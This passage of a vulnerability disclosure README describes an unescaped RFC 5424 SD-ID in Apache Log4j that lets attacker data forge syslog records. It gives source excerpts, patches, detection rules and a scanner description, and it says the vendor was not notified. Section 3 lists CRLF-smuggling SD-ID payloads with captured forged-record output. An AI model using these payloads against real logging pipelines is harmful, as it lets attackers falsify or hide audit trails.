# Log injection and record corruption in Apache Log4j — three findings

> **Status: publicly disclosed here on 2026-10-23.**
> No CVE has been assigned, and there is no upstream fix on any branch of either the 2.x or the 3.x
> line. **This repository is the disclosure** — the findings have not been reported to the Apache
> Logging Services security team, so nobody upstream knows about them yet. See
> [§12 Disclosure](#12-disclosure).
>
> | | |
> |---|---|
> | **Disclosed** | 2026-10-23, in this repository. Vendor **not** notified — see §12 |
> | **Repository** | <https://github.com/vindeckyy/log4j-log-injection> |
> | **Component** | `org.apache.logging.log4j.core.layout.Rfc5424Layout` (log4j-core) and `org.apache.logging.log4j.layout.template.json` (log4j-layout-template-json) |
> | **Class** | CWE-117 · CWE-93 · CWE-20 · CWE-1188 · CWE-1330 |
> | **Impact** | **Integrity** — forged syslog records with attacker-chosen header fields; audit-trail bypass; corrupted log-stream framing |
> | **Severity** | **High** for the primary finding — see [§1.3](#13-severity-rationale) |

## Findings at a glance

| # | Identifier | One line | Severity | Affected |
|---|---|---|---|---|
| 1 | [`LOG4J-SDID-INJECTION`](#1-summary) | An unescaped RFC 5424 `SD-ID` lets attacker data forge syslog records — on **both** the 2.x and 3.x lines | **High** | All 2.x and 3.x releases tested; every upstream branch |
| 2 | [`LOG4J-RFC5424-ATTR-DRIFT`](#101-loglj-rfc5424-attr-drift) | A 2.x `Rfc5424Layout` configuration silently loses its newline-escaping control on 3.x | Medium–High | 3.0.0-beta2, 3.0.0-beta3, `origin/main` |
| 3 | [`LOG4J-JSON-NONFINITE`](#102-loglj-json-nonfinite) | The CVE-2026-34481 fix was never ported to 3.x, so a JSON layout can emit an invalid `NaN` token | Medium | 3.0.0-beta2, 3.0.0-beta3, `origin/main` |

All three are live-proven against released artifacts, not inferred from source reading. The raw
captures are in [`docs/evidence/`](docs/evidence/).

---

## Table of contents

1. [Summary](#1-summary)
2. [The vulnerability](#2-the-vulnerability)
3. [Proof of concept](#3-proof-of-concept)
4. [Impact](#4-impact)
5. [Threat model](#5-threat-model)
6. [Affected versions](#6-affected-versions)
7. [Remediation](#7-remediation)
8. [Detection](#8-detection)
9. [What was ruled out](#9-what-was-ruled-out)
10. [Additional findings](#10-additional-findings)
11. [Related advisories](#11-related-advisories)
12. [Disclosure](#12-disclosure)
13. [Reproducing this audit](#13-reproducing-this-audit)
- [Appendix A — PoC source](#appendix-a--poc-source)
- [Appendix B — Glossary](#appendix-b--glossary)
- [Appendix C — Document changelog](#appendix-c--document-changelog)

---

## 1. Summary

### 1.1 What

Apache Log4j's `Rfc5424Layout` renders log events as RFC 5424 syslog records. A record has the
shape:

```
<PRI>VERSION TIMESTAMP HOSTNAME APP-NAME PROCID MSGID STRUCTURED-DATA MSG
```

`STRUCTURED-DATA` is a bracketed list of elements, each of which is `SD-ID` optionally followed
by `PARAM-NAME="PARAM-VALUE"` pairs:

```
[exampleSDID@32473 param="value" another="thing"]
```

Log4j sanitises **every** attacker-reachable part of that record — the message text, the
parameter names, the parameter values — **except the `SD-ID`**, which is written to the output
byte-for-byte, unvalidated and unescaped.

The consequence: an application that puts user-influenced data into an SD-ID gives that data
control over the shape of the emitted syslog record. The attacker can close the structured-data
element early, forge the syslog header fields, and — because the SD-ID is never newline-escaped
— inject a raw CRLF and **append a second, entirely attacker-authored syslog record** to the
stream.

This is not a theoretical parsing quirk. It was demonstrated end-to-end against real released
Log4j artifacts over a real TCP syslog socket, with the raw bytes captured off the wire:

```
<134>1 2026-10-23T09:04:00.519-04:00 death app 21997 v [x]^M$
<1>1 - evil - - - FORGED@32473] k$
```

Two records. The first is the application's own log line, truncated and malformed. The second is
the attacker's, complete and well-formed, with `HOSTNAME=evil`, `MSGID=FORGED`, and a message
body of the attacker's choosing.

### 1.2 Why it matters

* **The log stream is the audit trail.** Forging records is how an attacker removes themselves
  from an audit trail, or plants a false narrative in it.
* **It defeats the control that CVE-2026-34478 was issued to restore.** `newLineEscape` is
  honoured — it is applied to the message — but it is never applied to the SD-ID. An operator who
  did everything right is still exposed.
* **It is not a parsing-edge case.** The output is a *structured* format that Log4j correctly
  protects everywhere else. The SD-ID is the one field that slips through, which makes the
  defect look like a gap in the implementation rather than a deliberate design choice.
* **It is unfixed on every branch of both maintained lines**, including the 2.26.1 release and
  the 3.0.0-beta3 release.

### 1.3 Severity rationale

**High**, for integrity. It is comparable in class to CVE-2026-34478 (CVSS 4.0 **6.9 MEDIUM**),
but broader on three axes:

1. It affects **every** version, including the versions that fixed CVE-2026-34478.
2. It defeats the **mitigation** CVE-2026-34478 introduced (`newLineEscape`).
3. It affects **both** the 2.x and the 3.x lines, including released 3.x betas.

It is not rated Critical because exploitation requires the application to place
attacker-influenced data into an SD-ID — a configuration pattern, not a default. It is not rated
Medium because the precondition is a very common application pattern (see
[§5.2](#52-realistic-application-patterns)), the impact is a full audit-trail forgery with
attacker-chosen header fields, and the mitigation operators were told to apply does not work.

### 1.4 Affected versions at a glance

| Line | Releases | Development branches | Fixed? |
|---|---|---|---|
| **Log4j 2.x** | 2.17.1, 2.24.3, 2.26.1 (latest release) | `origin/2.x` (2.27.0-SNAPSHOT), `origin/2.26.x` (2.26.2-SNAPSHOT), `origin/2.25.x` (2.25.6-SNAPSHOT) | **No** |
| **Log4j 3.x** | 3.0.0-alpha1, 3.0.0-beta1, 3.0.0-beta2 (live-proven), 3.0.0-beta3 (latest release) | `origin/main` (3.0.0-SNAPSHOT) | **No** |

Full matrix and verification method: [§6](#6-affected-versions).

---

## 2. The vulnerability

### 2.1 Why the SD-ID is special

RFC 5424 §6.3.3 constrains the `SD-ID`:

> `SD-ID` = SD-NAME
> `SD-NAME` = 1*32PRINTUSASCII except '=', SP, ']', %d34 (DQUOTE)

So an SD-ID may contain printable US-ASCII **except** SPACE, `]`, `=` and `"`. The SD-ID is the
*name of a structured-data element*; it delimits the element and is the one part of the record
that a parser uses to decide where the element ends.

An SD-ID containing `]` terminates the element. An SD-ID containing CR or LF terminates the
*record*. Neither is possible under the RFC, and neither is prevented by Log4j.

### 2.2 Root cause, part 1 — the sink

`Rfc5424Layout.java` in Log4j 2.26.1 (`rel/2.26.1:log4j-core/src/main/java/org/apache/logging/log4j/core/layout/Rfc5424Layout.java`):

```java
554:    private void formatStructuredElement(
555:            final String id, final StructuredDataElement data, final StringBuilder sb, final ListChecker checker) {
556:        if ((id == null && defaultId == null) || data.discard()) {
557:            return;
558:        }
559:
560:        sb.append('[');
561:        sb.append(id);              // <-- SD-ID written verbatim: no validation, no escaping
562:        if (!mdcSdId.toString().equals(id)) {
563:            appendMap(data.getPrefix(), data.getFields(), sb, ListChecker.NOOP_CHECKER);
564:        } else {
565:            appendMap(data.getPrefix(), data.getFields(), sb, checker);
566:        }
567:        sb.append(']');
568:    }
```

The `id` string handed to this method is assembled by `getId()` from two unvalidated components:

```java
570:    private String getId(final StructuredDataId id) {
571:        final StringBuilder sb = new StringBuilder();
572:        if (id == null || id.getName() == null) {
573:            sb.append(defaultId);
574:        } else {
575:            sb.append(id.getName());      // <-- unvalidated
576:        }
577:        String ein = id != null ? id.getEnterpriseNumber() : enterpriseNumber;
578:        if (StructuredDataId.RESERVED.equals(ein)) {
579:            ein = enterpriseNumber;
580:        }
581:        if (!StructuredDataId.RESERVED.equals(ein)) {
582:            sb.append('@').append(ein);   // <-- also unvalidated
583:        }
584:        return sb.toString();
585:    }
```

Note line 582: the **enterprise-number** half of the SD-ID — everything after `@` — is not
length-checked and not character-checked *at all*, and is not covered by the 32-character limit
either.

### 2.3 Root cause, part 2 — the missing validation

`StructuredDataId` in log4j-api is where an SD-ID is created, and it is the natural place for the
invariant to be enforced. It enforces length and nothing else:

```java
 54:    private static final int MAX_LENGTH = 32;
...
100:    public StructuredDataId(final String name, final String[] required, final String[] optional, int maxLength) {
...
106:            if (name.length() > maxLength) {          // length check only
107:                throw new IllegalArgumentException(
108:                        String.format("Length of id %s exceeds maximum of %d characters", name, maxLength));
109:            }
110:            index = name.indexOf(AT_SIGN);
111:        }
112:
113:        if (index > 0) {
114:            this.name = name.substring(0, index);
115:            this.enterpriseNumber = name.substring(index + 1).trim();
116:        } else {
117:            this.name = name;                          // no character-set validation
118:        }
```

There is **no** character-set validation anywhere in log4j-api or log4j-core at 2.26.1. This was
verified by searching both modules rather than assuming it from the constructor.

The 3.x API is identical in this respect. `log4j-api` 3.0.0-beta2 was inspected at the bytecode
level; the only guard in the constructor is:

```
21: invokevirtual #12   // Method java/lang/String.length:()I
26: if_icmple     58
33: ldc           #20   // String Length of id %s exceeds maximum of %d characters
...
54: invokespecial #32   // Method java/lang/String/IllegalArgumentException."<init>":(Ljava/lang/String;)V
```

Full annotated source: [`docs/evidence/source-rfc5424layout-2.26.1.txt`](docs/evidence/source-rfc5424layout-2.26.1.txt),
[`…-3.x.txt`](docs/evidence/source-rfc5424layout-3.x.txt),
[`…-structureddataid-2.26.1.txt`](docs/evidence/source-structureddataid-2.26.1.txt),
[`…-structureddataid-3.x-bytecode.txt`](docs/evidence/source-structureddataid-3.x-bytecode.txt).

### 2.4 The differential — everything else *is* protected

This is the part that makes the SD-ID an outlier rather than a design choice. In the same class,
on the same code path, every other attacker-reachable field is handled correctly:

| Field | Protection | 2.26.1 | 3.0.0-SNAPSHOT |
|---|---|---|---|
| MSG text | `escapeNewlines(text, escapeNewLine)` | `:365` | `:369` |
| SD PARAM-NAME | `sanitizeParamName(...)` — invalid chars → `?`, truncated to 32 | `:606`, `:622-646`, `:664` | `:595` (via `escapeSDParams`) |
| SD PARAM-VALUE | `escapeParamValue(...)` (backslash-escapes `"`, `]`, `\`) then `escapeNewlines(...)` | `:607`, `:668` | `:596` (via `escapeSDParams`) |
| **SD-ID** | **none** | **`:561`** | **`:551`** |

The 2.x sanitiser is already exactly the character set RFC 5424 requires — Log4j already knows
how to do this correctly for PARAM-NAME:

```java
664:    private static boolean isParamNameCharacterValid(final char c) {
665:        return c > 32 && c <= 126 && c != '=' && c != ']' && c != '"';
666:    }
```

The SD-ID needs the identical rule (RFC 5424 §6.3.3 uses the same `SD-NAME` production for both)
and the identical newline escaping. Neither is applied.

### 2.5 CWE classification

| CWE | Why |
|---|---|
| **CWE-117** Improper Output Neutralization for Logs | The injected content reaches the log sink without neutralisation. |
| **CWE-93** CRLF Injection | A raw CR/LF in the SD-ID terminates the record and starts a new one. |
| **CWE-20** Improper Input Validation | `StructuredDataId` validates length but not the character set. |
| **CWE-74** (injection) | Attacker-controlled data is interpreted as record structure. |

### 2.6 Attack preconditions

1. The application logs a `StructuredDataMessage` (or a `StructuredDataId`-keyed map) whose
   SD-ID is derived from data an attacker can influence.
2. The output goes through `Rfc5424Layout` — either directly, or via `SyslogAppender` with
   `format="RFC5424"`.
3. The output is consumed as records rather than as opaque text.

No Log4j configuration change is required, and the default `SyslogAppender` (BSD) format is
**not** affected — see [§4.5](#45-what-is-not-affected).

---

## 3. Proof of concept

### 3.1 Files

| File | Purpose |
|---|---|
| [`poc/SdIdPoC.java`](poc/SdIdPoC.java) | The driver. Six payload modes. |
| [`poc/log4j2-rfc5424-sdid.xml`](poc/log4j2-rfc5424-sdid.xml) | File-appender config with `newLineEscape` enabled. |
| [`poc/log4j2-syslog-tcp.xml`](poc/log4j2-syslog-tcp.xml) | `SocketAppender` config, TCP / RFC 6587 — 2.x attribute names. |
| [`poc/log4j2-syslog-tcp-3x.xml`](poc/log4j2-syslog-tcp-3x.xml) | The same, with the renamed 3.x attribute names — required by 3.0.0-beta3. |
| [`poc/tcp_sink.py`](poc/tcp_sink.py) | Localhost syslog sink that records the raw wire bytes. |
| [`poc/run_poc.sh`](poc/run_poc.sh) | One-command reproduction, Log4j 2.x. |
| [`poc/run_poc_3x.sh`](poc/run_poc_3x.sh) | One-command reproduction, Log4j 3.x — 3.0.0-beta2 and 3.0.0-beta3. |
| [`log4j_audit.py`](log4j_audit.py) | Artifact / configuration / source scanner. |

The PoC uses **only** `127.0.0.1`. No traffic is sent to any third party.

### 3.2 Running it — Log4j 2.x

```console
$ ./poc/run_poc.sh
```

The script fetches `log4j-api` and `log4j-core` 2.26.1 from Maven Central into `poc/jars/`
if they are not already present, compiles the driver, and runs it.

Expected output (abridged):

```
--- B. network syslog over TCP (RFC 6587) ---

  raw bytes on the wire:
    <134>1 2026-10-23T09:04:00.519-04:00 death app 21997 v [x]^M$
    <1>1 - evil - - - FORGED@32473] k$

  what a line-oriented collector ingests:
    record 0: '<134>1 2026-10-23T09:04:00.519-04:00 death app 21997 v [x]\r'
      PRI       : <134>
      VERSION   : 1
      TIMESTAMP : 2026-10-23T09:04:00.519-04:00
      HOSTNAME  : death
      APP-NAME  : app
      PROCID    : 21997
      MSGID     : v
      SD        : [x]
      MSG       :
    record 1: '<1>1 - evil - - - FORGED@32473] k'
      PRI       : <1>
      VERSION   : 1
      TIMESTAMP : -
      HOSTNAME  : evil
      APP-NAME  : -
      PROCID    : -
      MSGID     : -
      SD        : FORGED@32473]
      MSG       : k

Done. Expect two records where one was logged: the forged one is attacker-authored.
```

### 3.3 Running it — Log4j 3.x

```console
$ ./poc/run_poc_3x.sh
```

This fetches both released 3.x stacks, uses the **same driver**, and produces the same result on
each:

```
=== RAW WIRE BYTES (Log4j 3.0.0-beta2, mode=crlf) ===
  total bytes: 98
  repr: b'<134>1 2026-10-23T10:08:46.265-04:00 death app 36848 v [x]\r\n<134>1 FORGED host app - - -@32473] k\n'

  line 0: b'<134>1 2026-10-23T10:08:46.265-04:00 death app 36848 v [x]\r'
  line 1: b'<134>1 FORGED host app - - -@32473] k'

=== RAW WIRE BYTES (Log4j 3.0.0-beta3, mode=crlf) ===
  total bytes: 98
  repr: b'<134>1 2026-10-23T10:08:53.403-04:00 death app 36927 v [x]\r\n<134>1 FORGED host app - - -@32473] k\n'

  line 0: b'<134>1 2026-10-23T10:08:53.403-04:00 death app 36927 v [x]\r'
  line 1: b'<134>1 FORGED host app - - -@32473] k'
```

The 3.0.0-beta3 run is the stronger of the two: its configuration uses the renamed 3.x
attributes (`includeNL` / `escapeNL`) and **turns newline escaping on**. The CRLF still reaches
the wire, because the escaping is never applied to the SD-ID. The bypass is independent of the
escaping setting.

Two packaging notes, both reproduced by the script:

* The 3.x API ships as `log4j-kit`, and there is no `log4j-api:3.0.0-beta3` on Maven Central.
  The working stack for beta3 is `log4j-kit` + `log4j-core` + `log4j-plugins` at 3.0.0-beta3
  plus `log4j-api:2.24.1`.
* The two releases disagree about attribute names (see
  [§10.1](#101-loglj-rfc5424-attr-drift)), so each stack is given the configuration its own
  release accepts. A configuration written for 2.x works on 3.0.0-beta2 and is silently ignored
  by 3.0.0-beta3.

### 3.4 The payload modes

The driver's six modes cover the meaningful variants of the attack:

| Mode | SD-ID payload | What it demonstrates |
|---|---|---|
| `baseline` | `goodId` | Reference output; a well-formed record. |
| `breakout` | `x] INJECTED 1 - host app - - -` | Closes the structured-data element; the payload lands where the syslog header fields go. |
| `crlf` | `x]\r\n<134>1 FORGED host app - - -` | Raw CRLF; appends a complete second record with a spoofed PRI. |
| `forge32` | `x]\r\n<1>1 - evil - - - FORGED` | The same, **inside the default 32-character limit** — no API change, no unusual configuration. |
| `forgebig` | `x]\r\n<1>1 2026-10-23T00:00:00Z evilhost evilapp 999 evilmsg - FORGED MESSAGE BODY HERE` | With `maxLength` raised, the payload is unbounded and produces a fully-populated forged record. |
| `einnl` | `id@1 evil\r\nINJECT2` | The **enterprise-number** half of the SD-ID is equally unvalidated and equally unescaped. |

`forge32` is the important one: the payload is **28 characters**, inside the default
`MAX_LENGTH` of 32. An operator cannot dismiss this as "only reachable if you raise the limit".

### 3.5 Why the existing mitigations do not work

#### `newLineEscape` does not reach the SD-ID

`escapeNewlines` is applied to the MSG (`:365`) and to the PARAM-VALUE (`:607`). It is never
applied to the SD-ID (`:561`). `newLineEscape="\\n"` is honoured — and has no effect on the
injection. The PoC config enables it, and the CRLF still reaches the wire.

#### RFC 5425 octet-counting does not contain it

The frame length is computed over the whole buffer *including* the injected content, so the
declared length no longer matches the first line. Measured on the `crlf` payload: the frame
declared **97** bytes while the first line carried only **59** bytes of record.

* A collector that reads 97 bytes swallows the forged record into the legitimate frame — it sees
  one malformed record rather than a forgery, which is arguably worse.
* A line-oriented collector (the common case for RFC 6587 / newline framing, which is the
  `SocketAppender` default) splits on the injected CRLF and receives the forgery as a **separate
  event**.
* RFC 6587 has no framing at all, so there is nothing to misalign.

#### The 32-character limit is a length check, not a security control

A complete forged RFC 5424 record fits inside it — see `forge32`. `StructuredDataMessage`'s
`maxLength` parameter lifts the cap entirely for `forgebig`.

#### The `SyslogAppender` default format is not affected — but `format="RFC5424"` is

This is the differential, and it is the clearest evidence that the SD-ID is an implementation
gap rather than a design decision. The *identical* SD-ID payload sent through the default
(BSD-format) `SyslogAppender` is neutralised, because `SyslogLayout` escapes newlines across
the whole formatted message:

```java
// SyslogLayout.java:157 (2.26.1) / :169 (3.x)
message = NEWLINE_PATTERN.matcher(message).replaceAll(escapeNewLine);
```

| Appender / layout | Wire bytes for SD-ID `x]\r\n<1>1 - evil - - - FORGED` |
|---|---|
| `SyslogAppender` default → `SyslogLayout` | `<134>Oct 23 08:53:05 death v [x]\n<1>1 - evil - - - FORGED ] k` — the CRLF **was** escaped to a literal `\n` |
| `SyslogAppender` `format="RFC5424"` → `Rfc5424Layout` | `<134>1 2026-10-23T08:53:08.703-04:00 death app 19526 v [x]^M$` + `<1>1 - evil - - - FORGED@32473] k` — the CRLF **survived** |

`Rfc5424Layout` escapes the MSG but not the SD-ID. `SyslogLayout` escapes everything.

---

## 4. Impact

### 4.1 Integrity loss — forged records

The attacker controls every field of the forged record:

```
<1>1 - evil - - - FORGED@32473] k
 └┬┘ └┬┘ └─┬─┘ └┬┘ └┬┘ └─┬─┘ └────┬─────┘ └┬┘
 PRI  VER  HOST APP PRO MSGID      SD-ID        MSG
```

That means: a different apparent **facility/severity** (`PRI`), a different apparent **host**,
a different apparent **application**, a different apparent **process**, a different **message
id**, and an arbitrary **message body**. A SIEM indexing these records has no way to tell them
apart from genuine ones.

### 4.2 Audit-trail bypass in practice

* **Concealment.** The attacker forges a record showing the operation they performed in a way
  that attributes it elsewhere — or forges records showing that a benign action happened when it
  did not.
* **False narrative.** Forged records can be used to make a SIEM's correlation and alerting fire
  on fabricated events, or to drown real ones.
* **Loss of the genuine record.** The legitimate record is truncated at the injected `]` and its
  structured-data element is malformed. Parsers may drop it or mis-attribute its fields.

### 4.3 Detection evasion

Because the forged record is a separate, well-formed event, detection logic that operates on
records — rules, correlation, thresholds, UEBA baselines — sees attacker-authored data presented
as if it came from the application. This is the same class of problem as the Log4net advisories
CVE-2026-105239 … CVE-2026-105244, which are all "a single untrusted value silently corrupts
or destroys log records".

### 4.4 Blast radius

Any deployment that ships RFC 5424 structured data over a network transport to a central
collector:

* a `SocketAppender` with an `Rfc5424Layout`;
* a `SyslogAppender` with `format="RFC5424"`;
* any custom `Appender` built on `Rfc5424Layout`.

This is the standard SIEM ingestion pattern. It is also exactly the pattern CVE-2026-34478 was
issued for.

### 4.5 What is *not* affected

* The default-format `SyslogAppender` (BSD) — it routes through `SyslogLayout`, which escapes
  newlines across the whole message. **Verified live.**
* `PatternLayout` — no escaping at all, but that is inherent to a plain-text format and applies
  equally to the application's own message. It is not a differential and not counted here.
* `XmlLayout`, `HtmlLayout`, `JsonTemplateLayout`, `GelfLayout`, `CsvLogEventLayout`,
  `CsvParameterLayout`, `YamlLayout`, `JsonLayout` — all correctly escape their content.
* `Log4j 1.x` — end-of-life, different code, different appenders. See
  [§9.6](#96-log4j-1x-end-of-life).

---

## 5. Threat model

### 5.1 Attacker capabilities required

* Ability to influence a string that the application passes as an SD-ID. This is typically
  remote and unauthenticated, or authenticated-but-low-privilege.
* No Log4j configuration access, no code execution, no special privileges.
* The victim application must be using `Rfc5424Layout` output.

### 5.2 Realistic application patterns

RFC 5424 structured data exists to carry per-event identifiers. The canonical uses:

| Use | Attacker control |
|---|---|
| Request / trace ID echoed from the client | Direct — `X-Request-Id` is attacker-supplied by definition |
| Tenant or account ID | Direct |
| Correlation / session ID | Direct if the client chooses it |
| Composite ID (`tenantId-requestId`) | Direct in the tenant component |
| Username in an SD-ID | Direct |
| Any ID derived from a URL, header, or form field | Direct |

The pattern "put the request ID into the RFC 5424 SD-ID" is close to canonical usage of the
feature, and request IDs are *designed* to come from the client.

### 5.3 Out of scope

* Log4j 1.x.
* The default BSD-format `SyslogAppender`.
* Applications that use `Rfc5424Layout` with only operator-configured SD-IDs (the `mdcId`,
  `id` and `loggerField sdId` attributes) and never build a `StructuredDataMessage` from
  application data. See [§9.5](#95-reachability-analysis).

---

## 6. Affected versions

### 6.1 Full matrix

Every ref below was checked for the raw SD-ID write (`sb.append(id);`) in
`Rfc5424Layout.formatStructuredElement`:

| Ref | Version | `sb.append(id);` | How verified |
|---|---|---|---|
| `rel/2.17.1` | 2.17.1 | **present** | source + live PoC |
| `rel/2.25.3` | 2.25.3 | **present** | source + live PoC |
| `rel/2.26.1` | 2.26.1 — latest 2.x release | **present** | source + live PoC |
| `origin/2.25.x` | 2.25.6-SNAPSHOT | **present** | source |
| `origin/2.26.x` | 2.26.2-SNAPSHOT | **present** | source |
| `origin/2.x` | 2.27.0-SNAPSHOT | **present** | source |
| `rel/3.0.0-alpha1` | 3.0.0-alpha1 | **present** | source |
| `rel/3.0.0-beta1` | 3.0.0-beta1 | **present** | source |
| `rel/3.0.0-beta2` | 3.0.0-beta2 | **present** | source + **live PoC** |
| `rel/3.0.0-beta3` | 3.0.0-beta3 — latest 3.x release | **present** | source + **live PoC** |
| `origin/main` | 3.0.0-SNAPSHOT | **present** | source |

### 6.2 Verification method

* **Source.** `git show <ref>:<path>` against a blobless clone of
  `https://github.com/apache/logging-log4j2`, checking for the literal `sb.append(id);` in
  `formatStructuredElement`.
* **Bytecode.** `javap -p -c` on `StructuredDataId.class` from the published
  `log4j-api-3.0.0-beta2.jar` to confirm the absence of character-set validation in the 3.x
  API, which is developed in a separate repository.
* **Live.** The PoC executed against real released artifacts —
  `log4j-core`/`log4j-api` 2.17.1, 2.24.3, 2.26.1,
  `log4j-core`/`log4j-api`/`log4j-plugins` 3.0.0-beta2, and
  `log4j-kit`/`log4j-core`/`log4j-plugins` 3.0.0-beta3 plus `log4j-api` 2.24.1 —
  with the raw bytes captured by a localhost sink.

### 6.3 A note on branch naming

This is easy to get wrong and worth stating explicitly, because it changes what "the latest
version" means:

* `origin/2.x` — the **2.x** development line (2.27.0-SNAPSHOT).
* `origin/2.26.x` — 2.x maintenance (2.26.2-SNAPSHOT).
* `origin/2.25.x` — 2.x older maintenance (2.25.6-SNAPSHOT).
* `origin/main` — the **Log4j 3.x** rewrite (3.0.0-SNAPSHOT). It is **not** the 2.x development
  line.

`origin/main` has a different module layout (no `log4j-api`; `log4j-kit`, `log4j-jctools`,
`log4j-config-jackson`, `log4j-config-yaml`, …) and carries the same defect.

### 6.4 The 3.x API packaging gap

`log4j-api` is published on Maven Central at 3.0.0-alpha1, 3.0.0-beta1 and 3.0.0-beta2 — but
**not** 3.0.0-beta3 (HTTP 404), while `log4j-core`, `log4j-plugins` *and* `log4j-kit` are all
published at 3.0.0-beta3. In the 3.x line the API moved out of `log4j-api` and into
`log4j-kit`.

The consequence is that the obvious pairing fails. `log4j-core:3.0.0-beta3` with
`log4j-api:3.0.0-beta2` dies at startup:

```
java.util.ServiceConfigurationError: org.apache.logging.log4j.spi.Provider:
  Provider org.apache.logging.log4j.core.impl.Log4jProvider could not be instantiated
Caused by: java.lang.NoSuchMethodError: 'java.util.stream.Stream
  org.apache.logging.log4j.util.ServiceLoaderUtil.safeStream(java.lang.Class,
  java.util.ServiceLoader, org.apache.logging.log4j.Logger)'
```

This is a release-packaging defect rather than a security one, and it is a trap for anyone
reproducing the finding: the 3.x line's newest release is *not* unusable, it is just paired
wrong. The working stack is

```
log4j-kit:3.0.0-beta3 + log4j-core:3.0.0-beta3 + log4j-plugins:3.0.0-beta3
    + log4j-api:2.24.1      (for the legacy API surface log4j-core still calls into)
```

and that is the stack the 3.0.0-beta3 live PoC in this report uses.

---

## 7. Remediation

### 7.1 Upstream fix — 2.x

`Rfc5424Layout` already has exactly the character-set predicate this needs, used for
PARAM-NAME. The SD-ID needs the identical rule plus newline escaping.

```java
// Rfc5424Layout.java — add alongside isParamNameCharacterValid()
private String sanitizeSdId(final String id) {
    if (id == null) {
        return null;
    }
    final int length = id.length();
    final StringBuilder sb = new StringBuilder(length);
    for (int i = 0; i < length; i++) {
        final char c = id.charAt(i);
        sb.append(isParamNameCharacterValid(c) ? c : '?');
    }
    return escapeNewlines(sb.toString(), escapeNewLine);
}
```

and at the sink:

```java
560:        sb.append('[');
561:        sb.append(sanitizeSdId(id));    // <-- was: sb.append(id);
```

Two details matter:

* `isParamNameCharacterValid` is `c > 32 && c <= 126 && c != '=' && c != ']' && c != '"'`
  (`:664-666`). RFC 5424 §6.3.3 defines `SD-NAME` — used for *both* SD-NAME and SD-ID — with
  exactly these exclusions, so the predicate is already correct for the SD-ID.
* The newline escape must be applied **after** the character filter, or instead of it. `?` is
  already a legal character, so filtering alone removes CR and LF; the escape is defence in
  depth and keeps the behaviour consistent with the MSG and PARAM-VALUE paths.

### 7.2 Upstream fix — 3.x

The same change applies to `origin/main`, where the sink is `Rfc5424Layout.java:551`. The 3.x
class already has `escapeSDParams` (`:602-603`) and `PARAM_VALUE_ESCAPE_PATTERN` (`:89`), but
those escape only `"`, `]` and `\` — they are *not* a substitute for the SD-ID character filter,
because they do not exclude SPACE or `=`, and they are not applied to the SD-ID at all.

```java
// 3.x Rfc5424Layout.java
551:        sb.append(sanitizeSdId(id));
```

### 7.3 Why the fix belongs in two places

The invariant should be enforced in `StructuredDataId`'s constructor (log4j-api) as well, so it
holds at the point of creation rather than only at the point of output. That protects any
consumer of a `StructuredDataId`, not just `Rfc5424Layout`.

But a fix **only** in `StructuredDataId` would not be enough either, because the `enterpriseNumber`
component is separately appended (`Rfc5424Layout.java:582`) and is not currently length- or
character-checked, and because `StructuredDataId` is public API whose behaviour other code may
depend on. The output-side filter in `Rfc5424Layout` is the load-bearing change.

**A 2.x-only patch would leave Log4j 3.x exploitable.** The fix must land on both `origin/2.x`
and `origin/main`.

### 7.4 User-side workarounds (until an upstream fix exists)

1. **Never place attacker-influenced data in an SD-ID.** Use a fixed, operator-chosen SD-ID and
   put the varying value in a PARAM-NAME/PARAM-VALUE pair — Log4j sanitises both of those
   (`sanitizeParamName`, `escapeParamValue`).
2. **If the SD-ID must be dynamic**, pre-sanitise it in application code before constructing the
   `StructuredDataMessage`:

   ```java
   private static final Pattern BAD_SD_ID = Pattern.compile("[^\\x21-\\x7E\\[\\]=\"\\\\]");
   static String safeSdId(String raw) {
       String s = BAD_SD_ID.matcher(raw == null ? "" : raw).replaceAll("?");
       return s.length() > 32 ? s.substring(0, 32) : s;
   }
   ```

   Keep it under 32 characters, and note that this does **not** cover the enterprise-number half
   — sanitize that too, or omit it.
3. **Treat the syslog stream as untrusted downstream.** Have the collector reject records whose
   structured-data element does not parse, and alert on records whose HOSTNAME / APP-NAME /
   PROCID do not match the emitting host.
4. **If RFC 5424 output is not required**, the default BSD-format `SyslogAppender` is not
   affected. Do not use `format="RFC5424"` until the fix lands.

### 7.5 Configuration guidance

```xml
<!-- Safe today: BSD format, SyslogLayout escapes the whole message -->
<SyslogAppender name="SYS" host="collector.example" port="514" format="RFC3164"/>

<!-- NOT safe today: RFC5424 routes through Rfc5424Layout -->
<SyslogAppender name="SYS" host="collector.example" port="514" format="RFC5424"/>
```

---

## 8. Detection

### 8.1 Log-level rules

An RFC 5424 record whose SD-ID contains `]`, `"`, `=`, SPACE or a control character is malformed
by definition, and indicates an injection attempt.

```
SD-ID !~ ^[!-~]{1,32}(\@[0-9]+)?$
```

Equivalent Sigma-style rule:

```yaml
title: RFC 5424 record with an invalid structured-data identifier
status: experimental
logsource:
  product: syslog
detection:
  sd_id_invalid:
    - 'sd_id|re: [\]"= ]'
    - 'sd_id|re: [\x00-\x1f]'
  condition: sd_id_invalid
```

### 8.2 Collector-level rules

* Reject any record whose STRUCTURED-DATA element does not parse per RFC 5424 §6.
* Alert when a record's HOSTNAME, APP-NAME or PROCID does not match the sender that delivered it.
* Alert when the count of records on a connection does not match the count of appends the
  application made — this catches both the injection and the truncation of the genuine record.
* A cheap high-confidence check: alert on any record whose PRI, HOSTNAME or PROCID changes
  *within* a single TCP connection from the application.

### 8.3 Static scanning

[`log4j_audit.py`](log4j_audit.py) in this repository flags:

* **`log4j-core` ≥ 2.0** and **`log4j-api` ≥ 2.9.0** as affected by `LOG4J-SDID-INJECTION`
  (the range covers the 3.x line as well — verified by running the scanner against the
  `log4j-core-3.0.0-beta2.jar` / `log4j-api-3.0.0-beta2.jar` artifacts).
* `<Rfc5424Layout>` configurations as an **exposure sink** (HIGH).
* `<SyslogAppender … format="RFC5424">` configurations as an **exposure sink** (HIGH).
* Source files that construct a `StructuredDataMessage` (HIGH) — these need manual review of
  where the SD-ID comes from.

```console
$ python3 log4j_audit.py /path/to/jars
```

Full output: [`docs/evidence/scanner-output.txt`](docs/evidence/scanner-output.txt).

### 8.4 Runtime instrumentation

If you cannot change the application, a `RoutingAppender` in front of the syslog appender can
reject records whose SD-ID fails the regex above. This is a mitigation of last resort and does
not stop the genuine record from being truncated.

---

## 9. What was ruled out

Recorded so it is not re-investigated. Every item was checked against source and, where the
behaviour was observable, against live jars.

### 9.1 JNDI lookups are properly gated

`Interpolator.java` registers the `jndi` lookup plugin **only** when
`JndiManager.isJndiLookupEnabled()` returns true (`lookup/Interpolator.java:86-88` in 2.26.1),
and `JndiManager.lookup()` rejects any URI whose scheme is not `java`:

```java
// core/net/JndiManager.java
249:            final URI uri = new URI(name);
